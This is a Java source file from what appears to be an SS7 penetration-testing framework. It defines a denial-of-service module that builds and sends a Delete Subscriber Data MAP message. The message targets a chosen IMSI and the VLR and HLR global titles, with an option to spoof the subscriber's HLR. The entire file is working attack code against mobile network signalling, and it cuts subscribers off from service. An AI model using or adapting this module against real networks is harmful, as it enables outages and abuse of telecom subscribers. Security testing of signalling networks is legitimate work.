/*
 * Etisalat Egypt, Open Source
 * Copyright 2021, Etisalat Egypt and individual contributors
 * by the @authors tag.
 *
 * This program is free software: you can redistribute it and/or modify
 * under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation; either version 3 of
 * the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>
 */

/**
 * @author Ayman ElSherif
 */

package com.rodan.intruder.ss7.usecases.attacks.dos;

import com.rodan.intruder.ss7.entities.event.model.mobility.DsdResponse;
import com.rodan.intruder.ss7.entities.event.service.MapMobilityServiceListener;
import com.rodan.intruder.ss7.entities.payload.mobility.DsdPayload;
import com.rodan.intruder.ss7.usecases.Ss7ModuleTemplate;
import com.rodan.intruder.ss7.usecases.model.Ss7ModuleConstants;
import com.rodan.intruder.ss7.usecases.model.Ss7ModuleOptions;
import com.rodan.intruder.ss7.usecases.model.dos.DosDsdOptions;
import com.rodan.intruder.ss7.usecases.model.dos.DosDsdResponse;
import com.rodan.intruder.ss7.usecases.port.Ss7Gateway;
import com.rodan.library.model.Constants;
import com.rodan.library.model.annotation.Module;
import com.rodan.library.model.error.SystemException;
import com.rodan.intruder.kernel.usecases.SignalingModule;
import lombok.Builder;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;

@Module(name = Ss7ModuleConstants.DOS_DSD_NAME, category = Ss7ModuleConstants.DOS_CATEGORY_DISPLAY_NAME,
        displayName = Ss7ModuleConstants.DOS_DSD_DISPLAY_NAME, brief = Ss7ModuleConstants.DOS_DSD_BRIEF,
        description = Ss7ModuleConstants.DOS_DSD_DESCRIPTION, rank = Ss7ModuleConstants.DOS_DSD_RANK,
        mainPayload = Constants.DSD_PAYLOAD_NAME)
public class DosDsdModule extends Ss7ModuleTemplate implements SignalingModule, MapMobilityServiceListener {
    final static Logger logger = LogManager.getLogger(DosDsdModule.class);

    @Builder
    public DosDsdModule(Ss7Gateway gateway, Ss7ModuleOptions moduleOptions) {
        super(gateway, moduleOptions);
    }

    @Override
    protected void generatePayload() {
        logger.debug("Generating payload");
        logger.debug("Module Options: " + moduleOptions);
        var options = (DosDsdOptions) moduleOptions;
        var payload = DsdPayload.builder()
                .localGt(options.getNodeConfig().getSs7Association().getLocalNode().getGlobalTitle())
                .imsi(options.getImsi()).targetVlrGt(options.getTargetVlrGt())
                .targetHlrGt(options.getTargetHlrGt()).spoofHlr(options.getSpoofHlr())
                .mapVersion(options.getMapVersion())
                .build();
        setMainPayload(payload);
        setCurrentPayload(getMainPayload());
        logger.debug("Payload: " + payload);
    }

    @Override
    protected void addServiceListener() throws SystemException {
        logger.debug("Adding service listeners");
        super.addServiceListener();
        var localSsn = getMainPayload().getLocalSsn();
        getGateway().addMobilityServiceListener(localSsn, this);
    }

    @Override
    protected void cleanup() throws SystemException {
        super.cleanup();
        if (getGateway() != null && getMainPayload() != null) {
            var localSsn = getMainPayload().getLocalSsn();
            getGateway().removeMobilityServiceListener(localSsn, this);
        }
    }

    @Override
    public void onDeleteSubscriberDataResponse(DsdResponse response) {
        logger.debug("##### Received DSD response!");
        logger.debug(response);
        moduleResponse = DosDsdResponse.builder().result("DSD response received successfully").build();
        setResultReceived(true);
    }
}
